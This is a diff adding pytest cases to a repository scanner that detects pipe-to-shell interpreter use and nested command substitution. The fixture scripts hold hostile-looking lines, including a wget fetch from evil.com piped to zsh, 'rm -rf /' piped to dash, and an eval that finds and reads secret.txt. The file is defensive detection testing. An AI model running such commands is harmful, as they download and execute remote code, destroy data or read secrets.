@@ -132,6 +132,96 @@ class TestExistingShellPatterns:
         assert any("Curl Pipe Bash" in f.title for f in findings)
 
 
+class TestPipeToShellInterpreter:
+    """Tests for generic pipe-to-shell interpreter detection (issue #15)."""
+
+    def test_echo_pipe_bash(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text('#!/bin/bash\necho "anything" | bash\n')
+        findings = _scan_repo(tmp_path)
+        assert any("Pipe to Shell Interpreter" in f.title for f in findings)
+
+    def test_cat_pipe_sh(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text("#!/bin/bash\ncat payload.txt | sh\n")
+        findings = _scan_repo(tmp_path)
+        assert any("Pipe to Shell Interpreter" in f.title for f in findings)
+
+    def test_wget_pipe_zsh(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text("#!/bin/bash\nwget -qO- http://evil.com/payload | zsh\n")
+        findings = _scan_repo(tmp_path)
+        assert any("Pipe to Shell Interpreter" in f.title for f in findings)
+
+    def test_pipe_to_ksh(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text("#!/bin/bash\nprintf '%s' \"$cmd\" | ksh\n")
+        findings = _scan_repo(tmp_path)
+        assert any("Pipe to Shell Interpreter" in f.title for f in findings)
+
+    def test_pipe_to_dash(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text("#!/bin/bash\necho 'rm -rf /' | dash\n")
+        findings = _scan_repo(tmp_path)
+        assert any("Pipe to Shell Interpreter" in f.title for f in findings)
+
+    def test_pipe_to_shell_severity_is_critical(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text('#!/bin/bash\necho "payload" | bash\n')
+        findings = _scan_repo(tmp_path)
+        shell_findings = [f for f in findings if "Pipe to Shell Interpreter" in f.title]
+        assert all(f.severity == "critical" for f in shell_findings)
+
+    def test_pipe_to_shell_category(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text('#!/bin/bash\necho "payload" | bash\n')
+        findings = _scan_repo(tmp_path)
+        shell_findings = [f for f in findings if "Pipe to Shell Interpreter" in f.title]
+        assert all(f.category == "shell-injection" for f in shell_findings)
+
+
+class TestNestedCommandSubstitution:
+    """Tests for nested command substitution detection (issue #15)."""
+
+    def test_eval_nested_cat_find(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text('#!/bin/bash\neval "echo $(cat $(find / -name \'secret.txt\' 2>/dev/null))"\n')
+        findings = _scan_repo(tmp_path)
+        assert any("Nested Command Substitution" in f.title for f in findings)
+
+    def test_result_nested_echo_whoami(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text("#!/bin/bash\nresult=$(echo $(whoami))\n")
+        findings = _scan_repo(tmp_path)
+        assert any("Nested Command Substitution" in f.title for f in findings)
+
+    def test_deeply_nested_substitution(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text("#!/bin/bash\ndata=$(curl $(cat /tmp/url.txt))\n")
+        findings = _scan_repo(tmp_path)
+        assert any("Nested Command Substitution" in f.title for f in findings)
+
+    def test_nested_substitution_severity_is_high(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text("#!/bin/bash\nresult=$(echo $(whoami))\n")
+        findings = _scan_repo(tmp_path)
+        nested = [f for f in findings if "Nested Command Substitution" in f.title]
+        assert all(f.severity == "high" for f in nested)
+
+    def test_nested_substitution_category(self, tmp_path):
+        sh = tmp_path / "evil.sh"
+        sh.write_text("#!/bin/bash\nresult=$(echo $(whoami))\n")
+        findings = _scan_repo(tmp_path)
+        nested = [f for f in findings if "Nested Command Substitution" in f.title]
+        assert all(f.category == "code-execution" for f in nested)
+
+    def test_single_substitution_not_flagged(self, tmp_path):
+        sh = tmp_path / "safe.sh"
+        sh.write_text("#!/bin/bash\nresult=$(date +%Y-%m-%d)\n")
+        findings = _scan_repo(tmp_path)
+        assert not any("Nested Command Substitution" in f.title for f in findings)
+
+
 class TestNoFalsePositives:
     """Ensure clean shell scripts don't trigger exfiltration patterns."""
 
@@ -155,6 +245,12 @@ class TestNoFalsePositives:
         findings = _scan_repo(tmp_path)
         exfil = [f for f in findings if f.category == "exfiltration"]
         assert len(exfil) == 0
+
+    def test_safe_pipe_to_grep_not_shell(self, tmp_path):
+        sh = tmp_path / "safe.sh"
+        sh.write_text("#!/bin/bash\nps aux | grep nginx\nls -la | sort\n")
+        findings = _scan_repo(tmp_path)
+        assert not any("Pipe to Shell Interpreter" in f.title for f in findings)
 
 
 class TestProcessEnvExposure:
